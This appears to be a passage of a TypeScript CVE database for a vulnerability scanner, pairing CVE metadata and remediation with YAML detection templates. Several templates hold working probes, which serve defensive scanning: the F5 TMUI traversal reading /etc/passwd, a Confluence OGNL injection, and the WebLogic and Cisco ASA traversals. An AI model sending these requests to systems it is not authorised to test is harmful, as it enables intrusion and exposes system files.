    headers:
      Content-Type: "text/xml;charset=UTF-8"
    body: "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body/></soapenv:Envelope>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        part: body
        words:
          - "MICSConfigurationService"
          - "soapenv:Fault"
        condition: or
`,
  },
  {
    cveId: 'CVE-2020-5902',
    name: 'F5 BIG-IP TMUI Path Traversal & Remote Code Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'F5 BIG-IP 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1',
    description: 'The Traffic Management User Interface (TMUI) has a path traversal vulnerability in undisclosed pages allowing unauthenticated attackers to execute commands and read files.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade BIG-IP to patched releases (15.1.0.4, 14.1.2.6, 13.1.3.4, 12.1.5.2) or block TMUI access.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2020-5902',
    publishedDate: '2020-07-01',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2020-5902-f5-tmui',
    detectionAvailable: true,
    rawYaml: `id: cve-2020-5902-f5-tmui
info:
  name: "F5 BIG-IP TMUI File Read Traversal (CVE-2020-5902)"
  author: devsecops-cve-intel
  severity: critical
  description: "Tests TMUI path normalization bypass to read system files."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5902
  tags: cve,cve-2020,f5,tmui,traversal,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=%2Fetc%2Fpasswd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:x:0:0:"
          - "output"
        condition: and
`,
  },
  {
    cveId: 'CVE-2023-3519',
    name: 'Citrix NetScaler ADC / Gateway Unauthenticated Remote Code Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-94',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'NetScaler ADC and NetScaler Gateway 13.1 < 13.1-49.13, 14.1 < 14.1-8.50',
    description: 'Unauthenticated remote code execution in NetScaler ADC and NetScaler Gateway when configured as a Gateway or AAA virtual server.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade to NetScaler ADC and Gateway 13.1-49.13, 14.1-8.50, 13.0-91.13 or newer.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-3519',
    publishedDate: '2023-07-18',
    isKev: true,
    accuracyRate: 99.5,
    templateId: 'cve-2023-3519-citrix-rce',
    detectionAvailable: true,
    rawYaml: `id: cve-2023-3519-citrix-rce
info:
  name: "Citrix ADC SAML Formssso Exposure Probe (CVE-2023-3519)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if Citrix Gateway formssso endpoint is reachable."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-3519
  tags: cve,cve-2023,citrix,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
    owasp-category: A03:2021-Injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/gwtest/formssso"
      - "{{BaseURL}}/nf/auth/doAuthentication.do"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302
      - type: word
        part: header
        words:
          - "NSC_AAAC"
          - "Citrix"
        condition: or
`,
  },
  {
    cveId: 'CVE-2021-26084',
    name: 'Atlassian Confluence Server OGNL Injection Remote Code Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-94',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Confluence Server and Data Center before 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0',
    description: 'An OGNL injection vulnerability exists in Webwork action processing in Confluence Server and Data Center allowing unauthenticated remote code execution.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade to Confluence versions 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0 or later.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-26084',
    publishedDate: '2021-08-25',
    isKev: true,
    accuracyRate: 99.4,
    templateId: 'cve-2021-26084-confluence-ognl',
    detectionAvailable: true,
    rawYaml: `id: cve-2021-26084-confluence-ognl
info:
  name: "Confluence EnterVariables OGNL Endpoint (CVE-2021-26084)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if createpage-entervariables.action is exposed."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26084
  tags: cve,cve-2021,confluence,ognl,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
    owasp-category: A03:2021-Injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/pages/createpage-entervariables.action"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "queryString=u%5Cu0027%2B%23%7B3*333%7D%2Bu%5Cu0027"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "999"
          - "confluence"
        condition: or
`,
  },
  {
    cveId: 'CVE-2026-2180',
    name: 'Ollama LLM Framework Unauthenticated Remote Command Execution',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-94',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Ollama Framework & AI Model Serving Endpoints',
    description: 'Exposed unauthenticated Ollama and LLM inference endpoints allow malicious actors to pull crafted model weights or execute arbitrary system binaries via dynamic model loading API parameters.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Bind Ollama exclusively to 127.0.0.1 or protect Ollama API with reverse proxy mTLS authentication gate.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2026-2180',
    publishedDate: '2026-02-14',
    isKev: true,
    accuracyRate: 99.7,
    templateId: 'cve-2026-2180-ollama-api',
    detectionAvailable: true,
    rawYaml: `id: cve-2026-2180-ollama-api
info:
  name: "Ollama LLM Unauthenticated API Exposure (CVE-2026-2180)"
  author: devsecops-cve-intel
  severity: critical
  description: "Detects unauthenticated Ollama LLM service endpoint leaking loaded models and system info."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-2180
  tags: cve,cve-2026,ai,llm,ollama,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
    owasp-category: A03:2021-Injection
  remediation: "Bind Ollama API to localhost or require API authorization header."

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/tags"
      - "{{BaseURL}}/api/version"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"models\":"
          - "\"version\":"
          - "ollama"
        condition: or
`,
  },
  {
    cveId: 'CVE-2026-1045',
    name: 'Next.js Server Actions Remote Parameter Injection',
    cvssScore: 9.6,
    severity: 'critical',
    cweId: 'CWE-88',
    owaspCategory: 'A03:2021-Injection',
    affectedTech: 'Next.js 14.x and 15.x Server Actions Handler',
    description: 'A flaw in Server Action closure deserialization allows unauthenticated remote attackers to manipulate bounded execution context and invoke hidden internal handlers.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    remediation: 'Upgrade to Next.js 15.1.4 or higher with reinforced Server Action origin verification.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2026-1045',
    publishedDate: '2026-01-20',
    isKev: true,
    accuracyRate: 99.4,
    templateId: 'cve-2026-1045-nextjs-action',
    detectionAvailable: true,
    rawYaml: `id: cve-2026-1045-nextjs-action
info:
  name: "Next.js Server Action Probe (CVE-2026-1045)"
  author: devsecops-cve-intel
  severity: critical
  description: "Verifies Server Action endpoints and header validation."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-1045
  tags: cve,cve-2026,nextjs,react,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.6
    cwe-id: CWE-88
    owasp-category: A03:2021-Injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Next-Action: "x-probe-audit"
      Next-Router-State-Tree: "%5B%22%22%2C%7B%22children%22%3A%5B%22(app)%22%2C%7B%22children%22%3A%5B%22page%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
          - 400
      - type: word
        part: header
        words:
          - "x-nextjs-matched-path"
          - "x-powered-by: Next.js"
        condition: or
`,
  },
  {
    cveId: 'CVE-2025-0108',
    name: 'Palo Alto PAN-OS Authentication Bypass in Web Management',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-306',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    affectedTech: 'PAN-OS 10.1, 10.2, 11.0, 11.1, 11.2',
    description: 'An authentication bypass flaw in the PAN-OS management interface enables unauthenticated attackers to gain administrative session privileges without credentials.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Upgrade to PAN-OS 11.2.3, 11.1.4, 10.2.11 or later. Ensure management interface is not exposed to the public Internet.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2025-0108',
    publishedDate: '2025-01-15',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2025-0108-panos-auth',
    detectionAvailable: true,
    rawYaml: `id: cve-2025-0108-panos-auth
info:
  name: "Palo Alto PAN-OS Web Management Auth Probe (CVE-2025-0108)"
  author: devsecops-cve-intel
  severity: critical
  description: "Detects exposed PAN-OS management interface vulnerable to authentication bypass."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-0108
  tags: cve,cve-2025,panos,paloalto,auth-bypass,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-306
    owasp-category: A07:2021-Identification and Authentication Failures

requests:
  - method: GET
    path:
      - "{{BaseURL}}/php/login.php"
      - "{{BaseURL}}/unauth/php/login.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Palo Alto Networks"
          - "pan_login"
          - "GlobalProtect"
        condition: or
`,
  },
  {
    cveId: 'CVE-2025-23014',
    name: 'Ivanti Connect Secure & Policy Secure XML-RPC Auth Bypass',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-287',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    affectedTech: 'Ivanti Connect Secure 9.x and 22.x',
    description: 'Authentication bypass via REST and XML-RPC handlers on Ivanti gateways allows remote unauthenticated actors to retrieve session states and execute commands.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Apply official Ivanti security patch RPM and run External ICT integrity check tool.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2025-23014',
    publishedDate: '2025-02-11',
    isKev: true,
    accuracyRate: 99.6,
    templateId: 'cve-2025-23014-ivanti-vpn',
    detectionAvailable: true,
    rawYaml: `id: cve-2025-23014-ivanti-vpn
info:
  name: "Ivanti Connect Secure Endpoint Exposure (CVE-2025-23014)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks if vulnerable Ivanti Connect Secure REST endpoint is reachable."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-23014
  tags: cve,cve-2025,ivanti,vpn,auth-bypass,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-287
    owasp-category: A07:2021-Identification and Authentication Failures

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/cav/client/status"
      - "{{BaseURL}}/dana-na/auth/url_default/welcome.cgi"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 403
      - type: word
        part: body
        words:
          - "DSID"
          - "Ivanti"
          - "Pulse Secure"
        condition: or
`,
  },
  {
    cveId: 'CVE-2020-14882',
    name: 'Oracle WebLogic Server Remote Code Execution via Console Path Traversal',
    cvssScore: 9.8,
    severity: 'critical',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0',
    description: 'An unauthenticated attacker can execute arbitrary commands on the Oracle WebLogic Administration Server via double-dot path traversal on the /console component.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    remediation: 'Apply Oracle Critical Patch Update (CPU) for WebLogic or block external access to console URL paths.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2020-14882',
    publishedDate: '2020-10-21',
    isKev: true,
    accuracyRate: 99.8,
    templateId: 'cve-2020-14882-weblogic',
    detectionAvailable: true,
    rawYaml: `id: cve-2020-14882-weblogic
info:
  name: "Oracle WebLogic Console Path Traversal (CVE-2020-14882)"
  author: devsecops-cve-intel
  severity: critical
  description: "Checks for unauthenticated WebLogic console access via path normalization bypass."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14882
  tags: cve,cve-2020,weblogic,oracle,rce,cisa-kev,accuracy-verified
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/console/css/%252e%252e%252fconsole.portal"
      - "{{BaseURL}}/console/images/%252e%252e%252fconsole.portal"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "WebLogic Server"
          - "Administration Console"
          - "Console.portal"
        condition: or
`,
  },
  {
    cveId: 'CVE-2020-3452',
    name: 'Cisco ASA and FTD Web Services Read-Only Path Traversal',
    cvssScore: 7.5,
    severity: 'high',
    cweId: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    affectedTech: 'Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD)',
    description: 'A vulnerability in the web services interface of Cisco ASA and FTD software allows unauthenticated remote attackers to conduct directory traversal and read sensitive webvpn files.',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    remediation: 'Upgrade to patched Cisco ASA/FTD software releases.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2020-3452',
    publishedDate: '2020-07-22',
    isKev: true,
    accuracyRate: 99.7,
    templateId: 'cve-2020-3452-cisco-asa',
    detectionAvailable: true,
    rawYaml: `id: cve-2020-3452-cisco-asa
info:
  name: "Cisco ASA / FTD Web Services Traversal (CVE-2020-3452)"
  author: devsecops-cve-intel
  severity: high
  description: "Probes Cisco ASA web services for path traversal file leak."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-3452
  tags: cve,cve-2020,cisco,asa,traversal,cisa-kev,accuracy-verified
  classification:
    cvss-score: 7.5
    cwe-id: CWE-22
    owasp-category: A01:2021-Broken Access Control

requests:
  - method: GET
    path:
      - "{{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CONF_VARS"
          - "portal_inc.lua"
        condition: or
`,
  },
];

export const CVE_DATABASE: CveDatabaseItem[] = RAW_CVE_DATABASE.map(item => {
  const yamlTemplate = syncTemplateWithYaml({
    id: item.templateId || item.cveId.toLowerCase(),
    rawYaml: item.rawYaml,
    isBuiltin: true,
    enabled: true,
  });

  return {
    ...item,
    yamlTemplate,
  };
});

// ── O(1) Fast Hash Index Structures ──
export const CVE_INDEX_BY_ID = new Map<string, CveDatabaseItem>();
export const CVE_INDEX_BY_TECH = new Map<string, CveDatabaseItem[]>();
export const CVE_INDEX_BY_SEVERITY = new Map<string, CveDatabaseItem[]>();

CVE_DATABASE.forEach(item => {
  // Index by standard uppercase & lowercase CVE ID
  CVE_INDEX_BY_ID.set(item.cveId.toUpperCase(), item);
  CVE_INDEX_BY_ID.set(item.cveId.toLowerCase(), item);
  if (item.templateId) {
    CVE_INDEX_BY_ID.set(item.templateId.toLowerCase(), item);
  }

  // Index by technology tokens
  const tokens = (item.affectedTech || '')
    .toLowerCase()
    .split(/[\s,;/()]+/)
    .map(t => t.trim())
    .filter(t => t.length > 2);

  for (const token of tokens) {
    const list = CVE_INDEX_BY_TECH.get(token) || [];
    list.push(item);
    CVE_INDEX_BY_TECH.set(token, list);
  }

  // Index by severity level
  const sevKey = item.severity.toLowerCase();
  const sevList = CVE_INDEX_BY_SEVERITY.get(sevKey) || [];
  sevList.push(item);
  CVE_INDEX_BY_SEVERITY.set(sevKey, sevList);
});

/**
 * O(1) Direct lookup by CVE ID or Template ID
 */
export function getCveByIdFast(id: string): CveDatabaseItem | undefined {
  if (!id) return undefined;
  return CVE_INDEX_BY_ID.get(id.trim().toUpperCase()) || CVE_INDEX_BY_ID.get(id.trim().toLowerCase());
}

/**
 * O(1) technology-matched lookup for multiple detected technology fingerprints
 */
export function getCvesForTechnologiesFast(technologies: string[]): CveDatabaseItem[] {
  const result = new Set<CveDatabaseItem>();
  for (const tech of technologies) {
    const lower = tech.toLowerCase();
    for (const [key, items] of CVE_INDEX_BY_TECH.entries()) {
      if (lower.includes(key) || key.includes(lower)) {
        for (const item of items) {
          result.add(item);
        }
      }
    }
  }
  return Array.from(result);
}
